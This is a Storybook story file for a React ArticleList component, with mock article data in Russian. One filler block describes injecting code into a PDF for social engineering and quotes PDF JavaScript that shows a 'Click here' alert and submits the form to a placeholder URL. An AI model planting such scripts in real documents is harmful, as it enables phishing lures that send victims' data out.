import React from 'react';
import { ComponentMeta, ComponentStory } from '@storybook/react';
import { ArticleList } from './ArticleList';
import {
  Article,
  ArticleBlockType,
  ArticleType,
  ArticleView,
} from '../../model/types/article';

const article: Article = {
  id: '1',
  title: 'Javascript news',
  subtitle: 'Что нового в JS в 2023 году?',
  img: 'https://www.androidfreeware.net/software_images/jsnews-javascript-news.thumb.png',
  view: 1022,
  user: {
    id: '1',
    username: 'Ivan',
  },
  createdAt: '10.03.2023',
  type: [ArticleType.IT],
  blocks: [
    {
      id: '1',
      type: ArticleBlockType.TEXT,
      title: 'Фреймворки CSS',
      paragraphs: [
        'Фреймворки CSS представляют собой код CSS, обеспечивающий набор правил, руководств и готовых элементов, которые можно использовать для эффективного создания веб-страниц. Обычно они включают в себя заранее разработанные компоненты UI вроде кнопок, форм и сеток, а также правила стилизации для типичных HTML-элементов.',
        'Это лишь некоторые из популярных фреймворков для фронтенд-разработки. При выборе одного из них важно учитывать такие факторы, как требования конкретного проекта, возможности и гибкость самого фреймворка, а также простоту использования и доступность кастомизации.',
      ],
    },
    {
      id: '3',
      type: ArticleBlockType.TEXT,
      title: 'Сборка файла для социальной инженерии',
      paragraphs: [
        'Для внедрения кода и разбора файлов я использовала библиотеку для Python pdfrw. Для экспериментов будем использовать документ file-sample_150kB.pdf. Во всех последующих примерах фигурирует следующий скрипт',
      ],
    },
    {
      id: '4',
      type: ArticleBlockType.CODE,
      code: "app.alert(\"Click here\");\n\nthis.submitForm('https://my.url/');",
    },
    {
      id: '5',
      type: ArticleBlockType.IMAGE,
      src: 'https://hsto.org/r/w1560/getpro/habr/upload_files/286/d04/6b3/286d046b3db760208e31363704a90735.png',
      title: 'Рисунок 15. Alert в Adobe Reader',
    },
  ],
};

const articles = new Array(16)
  .fill(null)
  .map((item, i) => (
    {
      ...article,
      id: i.toString(),
    }
  ));

export default {
  title: 'entities/Article/ArticleList',
  component: ArticleList,
  argTypes: {
    backgroundColor: { control: 'color' },
  },
} as ComponentMeta<typeof ArticleList>;

const Template: ComponentStory<typeof ArticleList> = (args) => <ArticleList {...args} />;

export const LoadingBig = Template.bind({});
LoadingBig.args = {
  articles: [],
  isLoading: true,
  view: ArticleView.BIG,
};

export const LoadingSmall = Template.bind({});
LoadingSmall.args = {
  articles: [],
  isLoading: true,
  view: ArticleView.SMALL,
};

export const ListBig = Template.bind({});
ListBig.args = {
  articles,
  view: ArticleView.BIG,
};

export const ListSmall = Template.bind({});
ListSmall.args = {
  articles,
  view: ArticleView.SMALL,
};
